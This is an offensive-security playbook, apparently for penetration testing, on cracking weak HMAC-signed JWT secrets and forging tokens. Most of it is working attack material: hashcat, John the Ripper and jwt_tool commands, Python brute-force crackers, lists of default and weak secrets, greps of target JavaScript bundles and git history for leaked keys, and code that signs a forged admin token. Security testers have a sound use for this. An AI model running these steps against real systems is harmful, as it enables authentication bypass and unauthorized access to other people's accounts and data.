# JWT Weak Secret Cracking

## When this applies

- Token is signed with HS256/HS384/HS512 (HMAC).
- Application uses a short, default, or dictionary-word secret.
- You have a valid token sample to crack against (offline attack).

## Technique

HMAC verification is symmetric — the secret used to sign equals the secret used to verify. Recover the secret offline by trying candidate values until the recomputed signature matches the token's signature. Once cracked, you can sign arbitrary payloads.

## Steps

### 1. Identify HMAC algorithm

Decode header (`echo "<header>" | base64 -d`) and confirm `alg` is `HS256`, `HS384`, or `HS512`. Asymmetric algs (RS*, ES*, PS*) are NOT crackable this way — different attack class.

### 2. Save the JWT to a file

```bash
echo "eyJhbGc..." > jwt.txt
```

### 3. Hashcat (HS256/HS384/HS512)

```bash
# Hash modes:
#   16500 = JWT (HS256)
#   16511 = JWT (HS384)
#   16512 = JWT (HS512)

# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list

# Dictionary + rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule

# Mask brute-force
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l                # 6 lowercase
hashcat -a 3 -m 16500 jwt.txt secret?d?d?d?d              # secretNNNN

# Hybrid (wordlist + 4 digits suffix)
hashcat -a 6 -m 16500 jwt.txt wordlist.txt ?d?d?d?d

# GPU optimization
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -O -w 3

# Show cracked
hashcat -m 16500 jwt.txt --show
```

### 4. John the Ripper

```bash
echo "eyJ..." > jwt.txt
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
john --show jwt.txt
```

### 5. jwt_tool

```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
# After cracking, forge a token:
python3 jwt_tool.py <JWT> -T -S hs256 -p <found-secret>
```

### 6. Custom Python (low-overhead)

```python
import jwt

def crack_jwt(token, wordlist_file):
    with open(wordlist_file) as f:
        for line in f:
            secret = line.strip()
            try:
                jwt.decode(token, secret, algorithms=['HS256'])
                print(f"[+] Found: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                continue
    return None
```

### 7. Multi-threaded for big wordlists

```python
import jwt, concurrent.futures

def test(token, secret):
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        return secret
    except:
        return None

def crack_parallel(token, wordlist_file, threads=10):
    with open(wordlist_file) as f:
        secrets = [l.strip() for l in f]
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for fut in concurrent.futures.as_completed({ex.submit(test, token, s): s for s in secrets}):
            r = fut.result()
            if r:
                ex.shutdown(wait=False)
                return r
```

### 8. Common weak secrets

```
secret              your-256-bit-secret      changeit
secret1             your-secret-key          admin
secret123           jwt_secret               qwerty
secretkey           default                  123456
mysecretkey         key                      password
private
```

### 9. Framework defaults

Sweep these before serious cracking:

| Framework | Common defaults |
|---|---|
| Spring Boot | `secret`, `spring-boot-secret`, `default-key` |
| Django | `django-insecure-secret`, `secret-key-here` |
| Node.js | `your-256-bit-secret`, `secret`, `secretkey` |
| ASP.NET | `SecretKey123`, `MySecretKey` |

### 10. Check JS bundles for the secret

Modern SPA apps sometimes ship the JWT secret in the JS bundle (Next.js `getServerSideProps`, Edge runtime, etc.):

```bash
curl -sk TARGET/_next/static/chunks/app/login/page-*.js | grep -i 'secret\|sign\|HS256\|encode'
```

Patterns:
- `new TextEncoder().encode("KEY")`
- `setProtectedHeader({alg:"HS256"})`
- `jwt.sign(payload, "SECRET")`

### 11. Recover redacted secret from git history

When source code has `JWT_SECRET = "REDACTED"` or `var key = Encoding.ASCII.GetBytes("****");`, the secret is almost always in an earlier commit:

```bash
git log -p -- <auth-file>
git log -p | grep -B2 -A2 -iE 'secret|key|password|hmac'
git log --all --oneline; git show <sha>:<auth-file>
```

For .NET specifically, `ClaimTypes.Name` short-name is `unique_name` — match this when forging tokens (e.g. `{"unique_name":"1"}` for admin id=1).

### 12. Sign forged token

Once secret recovered:

```python
import jwt
token = jwt.encode({"sub":"admin","role":"admin"}, "found_secret", algorithm="HS256")
```

## Verifying success

- Hashcat output: `<jwt>:<secret>`.
- jwt.io with the recovered secret shows "Signature Verified".
- Forged token authenticates against the legitimate API (200 instead of 401).

## Common pitfalls

- HS384 / HS512 are slower to crack — use the right mode (`16511` / `16512`).
- Hashcat may report "exhausted" if the wordlist is small; chain `--increment` or use rules.
- Some apps use binary secrets (e.g. PEM file contents) — wordlist attacks won't find them.
- Once cracked, the secret may rotate; capture a fresh token and re-run if the original stops working.
- Don't forget to keep the same `kid` (Key ID) header if the verifier uses it — even a forged HS256 with the right secret can fail if the kid mismatches.

## Tools

- Hashcat (`-m 16500/16511/16512`).
- John the Ripper (`--format=HMAC-SHA256`).
- jwt_tool (`-C -d wordlist.txt`).
- jwt.secrets.list (custom JWT-secret wordlist on GitHub).
